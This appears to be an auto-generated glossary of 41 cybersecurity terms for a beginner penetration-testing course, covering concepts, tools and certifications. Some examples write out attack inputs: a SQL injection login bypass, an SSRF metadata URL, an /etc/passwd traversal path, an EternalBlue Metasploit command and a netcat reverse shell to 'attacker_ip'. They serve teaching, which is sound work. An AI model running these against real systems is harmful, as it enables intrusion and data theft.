# Technieum Glossary — 41 Terms

_Auto-generated from `src/lib/data/glossary.ts`. Do not edit by hand — run `npm run docs:generate`._

---

## CIA Triad (Confidentiality, Integrity, Availability)

**Category:** Core Concept

The three foundational principles of information security. Every security control maps to at least one.

> **Example:** Encrypting a file protects Confidentiality. A hash verifies Integrity. A backup ensures Availability.

**Learn more:** NIST SP 800-12

---

## CVE (Common Vulnerabilities and Exposures)

**Category:** Vulnerability Mgmt

A unique public identifier for a specific known vulnerability (e.g. CVE-2021-44228).

> **Example:** Log4Shell was CVE-2021-44228. Both attackers and defenders use this ID to communicate about the same flaw.

**Learn more:** cve.mitre.org

---

## CWE (Common Weakness Enumeration)

**Category:** Vulnerability Mgmt

A list of software/hardware weakness types (root causes). CVE describes an instance; CWE describes the class.

> **Example:** CWE-79 = 'Improper Neutralisation of Input During Web Page Generation' — the root cause of all XSS.

**Learn more:** cwe.mitre.org

---

## CVSS (Common Vulnerability Scoring System)

**Category:** Vulnerability Mgmt

A framework for rating the severity of vulnerabilities on a 0.0-10.0 scale. Used to prioritise patching.

> **Example:** CVSS 9.8 = Critical (patch today). CVSS 2.0 = Low (schedule for next maintenance window).

**Learn more:** nvd.nist.gov

---

## IOC (Indicator of Compromise)

**Category:** Threat Intel

Evidence that a system has been breached: suspicious IPs, domains, file hashes, registry keys, process names.

> **Example:** Finding connections to a known C2 IP in firewall logs is an IOC.

**Learn more:** MITRE ATT&CK

---

## APT (Advanced Persistent Threat)

**Category:** Threat Intel

A sophisticated long-term cyberattack (often state-sponsored) that gains and maintains stealthy network access.

> **Example:** APT29 (Cozy Bear) is a Russian group that attacked US government networks for months before detection.

**Learn more:** MITRE ATT&CK Groups

---

## Zero-Day (Zero-Day Vulnerability)

**Category:** Vulnerability Mgmt

A vulnerability unknown to the vendor with no available patch. Extremely dangerous.

> **Example:** A zero-day in a browser's PDF engine could allow drive-by code execution on any visitor to a malicious page.

**Learn more:** NVD | Zerodium

---

## TTPs (Tactics, Techniques, and Procedures)

**Category:** Threat Intel

Describes HOW attackers operate: Tactics=goals, Techniques=how, Procedures=specific implementations.

> **Example:** Tactic: Credential Access. Technique: Brute Force. Procedure: Using Hydra on SSH port 22.

**Learn more:** MITRE ATT&CK

---

## MITRE ATT&CK (MITRE Adversarial Tactics Techniques & Common Knowledge)

**Category:** Threat Intel

A knowledge base of real-world adversary TTPs used by defenders to map threats to known actor behaviour.

> **Example:** A SOC analyst maps a detected lateral movement technique to ATT&CK T1021 to find related detections.

**Learn more:** attack.mitre.org

---

## RAM (Random Access Memory)

**Category:** Hardware

Volatile memory that holds data currently in use by the CPU. Lost when power is removed. Very fast.

> **Example:** When you open a browser, it loads into RAM. Crash = data lost. Forensics can dump RAM to find artefacts.

---

## ROM (Read-Only Memory)

**Category:** Hardware

Non-volatile memory retaining data without power. Stores firmware like BIOS/UEFI.

> **Example:** BIOS settings survive reboots because they are in EEPROM (a type of ROM).

---

## CPU (Central Processing Unit)

**Category:** Hardware

The brain of the computer. Executes instructions. Relevant in security for understanding buffer overflows and processes.

> **Example:** A buffer overflow exploit overwrites the return address on the stack, hijacking the CPU instruction pointer.

---

## BIOS/UEFI (Basic Input Output System / Unified Extensible Firmware Interface)

**Category:** Hardware

Firmware that initialises hardware at boot and loads the OS. UEFI is the modern replacement for legacy BIOS.

> **Example:** UEFI Secure Boot prevents unsigned bootloader code — stops bootkits from persisting through reimaging.

---

## OSI Model (Open Systems Interconnection Model)

**Category:** Networking

A 7-layer conceptual framework for network communication: Physical, Data Link, Network, Transport, Session, Presentation, Application.

> **Example:** Wireshark captures at Layer 2/3. XSS is a Layer 7 attack. A WAF defends at Layer 7.

**Learn more:** RFC 1122

---

## DNS (Domain Name System)

**Category:** Networking

Translates domain names to IP addresses. The 'phone book' of the internet.

> **Example:** DNS cache poisoning redirects users to attacker-controlled servers by corrupting DNS records.

**Learn more:** RFC 1035

---

## VPN (Virtual Private Network)

**Category:** Networking

Encrypts internet traffic and tunnels it through a server, masking real IP and protecting data in transit.

> **Example:** TryHackMe and HackTheBox require VPN connections to access their lab networks.

---

## OWASP (Open Web Application Security Project)

**Category:** Web Security

Non-profit producing the OWASP Top 10 — the most critical web application vulnerabilities ranked by prevalence.

> **Example:** The OWASP Top 10 includes SQL Injection, XSS, and Broken Access Control. Essential reading for any web pentester.

**Learn more:** owasp.org

---

## XSS (Cross-Site Scripting)

**Category:** Web Security

Injection attack where malicious scripts are injected into trusted websites and run in victims' browsers.

> **Example:** Stored XSS in a comment box executes JS in every visitor's browser, stealing their session cookies.

**Learn more:** PortSwigger Academy

---

## SQLi (SQL Injection)

**Category:** Web Security

Inserting malicious SQL into a query to manipulate the database — read, modify, or delete data.

> **Example:** Entering ' OR '1'='1-- in a login field can bypass authentication.

**Learn more:** PortSwigger Academy

---

## SSRF (Server-Side Request Forgery)

**Category:** Web Security

Tricks the server into making HTTP requests to internal resources or unintended external services.

> **Example:** SSRF payload http://169.254.169.254/latest/meta-data/ reads AWS instance metadata from a vulnerable app.

**Learn more:** PortSwigger Academy

---

## RCE (Remote Code Execution)

**Category:** Vulnerability

A class of vulnerability allowing an attacker to run arbitrary code on a remote system.

> **Example:** Log4Shell (CVE-2021-44228) was RCE — attackers could run commands on any vulnerable Java server.

**Learn more:** NVD

---

## LFI (Local File Inclusion)

**Category:** Web Security

Including local server files via user input. Can read /etc/passwd or source code.

> **Example:** ?page=../../../../etc/passwd reads the password file on a vulnerable PHP application.

**Learn more:** OWASP Testing Guide

---

## IDOR (Insecure Direct Object Reference)

**Category:** Web Security

Broken Access Control: an object reference (ID) is exposed and not validated.

> **Example:** Changing /api/user/123 to /api/user/124 to view another user's private data.

**Learn more:** PortSwigger Academy

---

## Payload (Payload)

**Category:** Exploitation

The component of an exploit that performs the malicious action after a vulnerability is triggered.

> **Example:** A Metasploit reverse_tcp payload opens a shell back to the attacker after exploiting a service.

---

## C2 (Command and Control)

**Category:** Exploitation

Infrastructure used by attackers to issue commands to compromised systems and receive stolen data.

> **Example:** Malware beacons to a C2 server every 30 seconds to check for new commands.

**Learn more:** MITRE ATT&CK T1071

---

## Privesc (Privilege Escalation)

**Category:** Exploitation

Gaining higher access than originally obtained. Vertical = low user to admin/root. Horizontal = another user's access.

> **Example:** Exploiting a misconfigured SUID binary (e.g. /usr/bin/find) to escalate from www-data to root.

**Learn more:** GTFOBins | HackTricks

---

## Lateral Movement (Lateral Movement)

**Category:** Exploitation

Techniques to move from one compromised host to others within a network.

> **Example:** After compromising a developer's laptop, using Pass-the-Hash to authenticate to the domain controller.

**Learn more:** MITRE ATT&CK T1021

---

## Hash (Cryptographic Hash)

**Category:** Cryptography

One-way function converting any data into a fixed-length string. Cannot be reversed (only cracked).

> **Example:** MD5('password')=5f4dcc3b5aa765d61d8327deb882cf99. Cracking leaked hashes offline is a standard post-exploitation step.

**Learn more:** CryptoHack.org

---

## Pentest (Penetration Test)

**Category:** Career

An authorised simulated attack on a system to find vulnerabilities before real attackers do.

> **Example:** A company hires a pentesting firm to attack their app before launch. Findings are reported and fixed.

**Learn more:** PTES Standard

---

## eJPT (eLearnSecurity Junior Penetration Tester)

**Category:** Certification

Entry-level pentesting cert by INE. Good first milestone after completing this 4-month programme.

> **Example:** After this programme you should be ready to attempt the eJPT exam.

**Learn more:** ine.com

---

## OSCP (Offensive Security Certified Professional)

**Category:** Certification

Highly respected cert by OffSec. 24-hour practical exam. Often required for senior pentester roles.

> **Example:** Target OSCP 1-2 years after eJPT. Requires HTB/VulnMachines practice.

**Learn more:** offensive-security.com

---

## SIEM (Security Information and Event Management)

**Category:** Threat Intel

A platform that aggregates and correlates logs across an organisation to detect and alert on suspicious activity.

> **Example:** A SOC analyst queries Splunk (a SIEM) to correlate failed logins across 40 servers in 5 minutes.

**Learn more:** Splunk | Microsoft Sentinel

---

## SOC (Security Operations Center)

**Category:** Career

A team (and often a physical/virtual room) responsible for monitoring, detecting, and responding to security incidents 24/7.

> **Example:** Tier 1 SOC analysts triage SIEM alerts; Tier 3 analysts perform deep-dive incident response.

**Learn more:** TryHackMe SOC Level 1

---

## EDR (Endpoint Detection and Response)

**Category:** Networking

Software agents on endpoints that monitor behaviour in real time and can isolate or remediate compromised machines.

> **Example:** CrowdStrike Falcon (an EDR) auto-isolates a laptop the moment it detects ransomware-like file encryption.

**Learn more:** CrowdStrike | Microsoft Defender for Endpoint

---

## WAF (Web Application Firewall)

**Category:** Web Security

A firewall that inspects HTTP/HTTPS traffic for malicious patterns (SQLi, XSS payloads) and blocks them before reaching the app.

> **Example:** Cloudflare's WAF blocks a request containing ' OR 1=1-- before it ever reaches the origin server.

**Learn more:** OWASP WAF Guide

---

## NGFW (Next-Generation Firewall)

**Category:** Networking

A firewall combining traditional packet filtering with deep packet inspection, intrusion prevention, and application awareness.

> **Example:** A Palo Alto NGFW blocks traffic based on the specific app (e.g. BitTorrent) rather than just port number.

**Learn more:** Palo Alto Networks

---

## Active Directory (Active Directory Domain Services)

**Category:** Networking

Microsoft's directory service for centrally managing users, computers, and permissions across a corporate Windows network.

> **Example:** BloodHound maps AD trust relationships to find the shortest attack path to Domain Admin.

**Learn more:** Microsoft Docs | TryHackMe AD Basics

---

## Burp Suite (Burp Suite)

**Category:** Web Security

The industry-standard intercepting proxy for web application penetration testing — captures, modifies, and replays HTTP traffic.

> **Example:** Using Burp Repeater to manually resend a modified SQLi payload dozens of times while tuning it.

**Learn more:** PortSwigger

---

## Metasploit (Metasploit Framework)

**Category:** Exploitation

An open-source exploitation framework bundling exploit modules, payloads, and post-exploitation tools behind msfconsole.

> **Example:** `use exploit/windows/smb/ms17_010_eternalblue` loads the EternalBlue module inside msfconsole.

**Learn more:** rapid7.com/metasploit

---

## Shodan (Shodan Search Engine)

**Category:** Threat Intel

A search engine that indexes internet-connected devices and their exposed banners/services, used heavily in passive recon.

> **Example:** Searching `hostname:"example.com"` on Shodan reveals every internet-facing host and open port for that domain.

**Learn more:** shodan.io

---

## Reverse Shell (Reverse Shell)

**Category:** Exploitation

A shell session initiated FROM the compromised target back TO the attacker's listener, bypassing inbound firewall rules.

> **Example:** `nc -e /bin/sh attacker_ip 4444` connects out from a compromised web server to the attacker's netcat listener.

**Learn more:** MITRE ATT&CK T1059

---

